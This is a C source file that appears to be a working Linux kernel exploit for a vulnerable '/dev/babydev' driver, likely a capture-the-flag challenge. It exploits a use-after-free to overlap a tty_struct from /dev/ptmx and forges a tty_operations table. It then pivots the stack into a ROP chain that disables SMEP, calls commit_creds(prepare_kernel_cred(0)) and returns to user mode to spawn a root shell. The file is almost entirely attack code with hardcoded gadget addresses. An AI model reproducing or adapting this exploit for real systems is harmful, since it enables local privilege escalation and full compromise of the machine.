#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>
#include <sys/wait.h>
#define TTY_STRUCT_SIZE 0x2e0
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
	struct file *filp, int idx);
	int (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int (*write)(struct tty_struct * tty,
	const unsigned char *buf, int count);
	int (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int (*write_room)(struct tty_struct *tty);
	int (*chars_in_buffer)(struct tty_struct *tty);
	int (*ioctl)(struct tty_struct *tty,
	unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
	unsigned int cmd, unsigned long arg);
	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
	void (*throttle)(struct tty_struct * tty);
	void (*unthrottle)(struct tty_struct * tty);
	void (*stop)(struct tty_struct *tty);
	void (*start)(struct tty_struct *tty);
	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);
	void (*flush_buffer)(struct tty_struct *tty);
	void (*set_ldisc)(struct tty_struct *tty);
	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
	void (*send_xchar)(struct tty_struct *tty, char ch);
	int (*tiocmget)(struct tty_struct *tty);
	int (*tiocmset)(struct tty_struct *tty,
	unsigned int set, unsigned int clear);
	int (*resize)(struct tty_struct *tty, struct winsize *ws);
	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
	int (*get_icount)(struct tty_struct *tty,
	struct serial_icounter_struct *icount);
	const struct file_operations *proc_fops;
};

void debug(){
	puts("Debuging...");
    getchar();
}
int fd;
void init()
{
	fd = open("/dev/note", 0);
	if (fd < 0)
		exit(-1);
	puts("[*] init done!");
}
void errExit(const char* msg)
{
	puts(msg);
	exit(-1);
}

typedef int __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred_func)(unsigned long cred);
commit_creds_func commit_creds = (commit_creds_func) 0xffffffff810a1420;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) 0xffffffff810a1810;
unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;

static void save_state() {
	asm(
	"movq %%cs, %0\n"
	"movq %%ss, %1\n"
	"pushfq\n"
	"popq %2\n"
	: "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory"		);
}

void shell(void) {
	if(!getuid())
		system("/bin/sh");
	exit(0);
}

void getroot() {
	commit_creds(prepare_kernel_cred(0));
}
uint64_t xchgeaxesp = 0xffffffff812f250f;//xchg eax, esp; ret 0xb8;

int main(int argc, char const *argv[]){
	save_state();
	int fd1 = open("/dev/babydev",O_RDWR);
	int fd2 = open("/dev/babydev",O_RDWR);
	//both fd1 fd2 point to 0xa8 now
	ioctl(fd1,0x10001,TTY_STRUCT_SIZE);
	//fd2 has a dangling pointer
	close(fd1);
	//fd2 and fd3 should use same memory
	int fd3 =  open("/dev/ptmx",O_RDWR| O_NOCTTY);
	uint64_t* fake_tty = (uint64_t*)malloc(0x20);
	read(fd2,fake_tty,0x20);
	uint64_t* magic = (uint64_t *)fake_tty;
	//check whether fd2 point to ptmx now
	if(*magic == 0x100005401){
		//prepare fake tty opera
		struct tty_operations *fake_tty_opera = (struct tty_operations*)malloc(sizeof(struct tty_operations));
		fake_tty_opera->ioctl = (uint64_t) xchgeaxesp;
		uint64_t lower_addr = 0x812f250f;
		uint64_t base = lower_addr& 0xffff0000;
		uint64_t poprdi_ret = 0xffffffff810d238d;
		uint64_t write_cr4 = 0xffffffff81004d80;//mov cr4, rdi; pop rbp; ret;
		uint64_t swapgs = 0xffffffff81063694;// swapgs; pop rbp; ret; 
		uint64_t iretq = 0xffffffff814e35ef;//iretq; ret; 
		void * mapped,*temp_stack;
		if((mapped = mmap((void*)base, 0x20000, 7, 0x32, 0, 0)) != (void*)base){
			errExit("mmap failed");	
		}
		*(uint64_t*)lower_addr = poprdi_ret;
		lower_addr+=0xc0;
		uint64_t rop_chain[]={
			//poprdi_ret,
			0x6f0,
			write_cr4,
			0,//rbp
			(uint64_t )getroot,
			swapgs,
			0,//rbp
			iretq,
			(uint64_t)shell,
			user_cs,
			user_rflags,
			base+0x10000,
			user_ss
		};
		memcpy((uint64_t *)lower_addr,rop_chain,sizeof(rop_chain));
		fake_tty[3] = (uint64_t)fake_tty_opera;
		//modify tty struct
		write(fd2,fake_tty,0x20);	
		//triger rop
		ioctl(fd3,0,0);
	}else{

		errExit("tty struct spray failed.");	
	}
	return 0;	
}

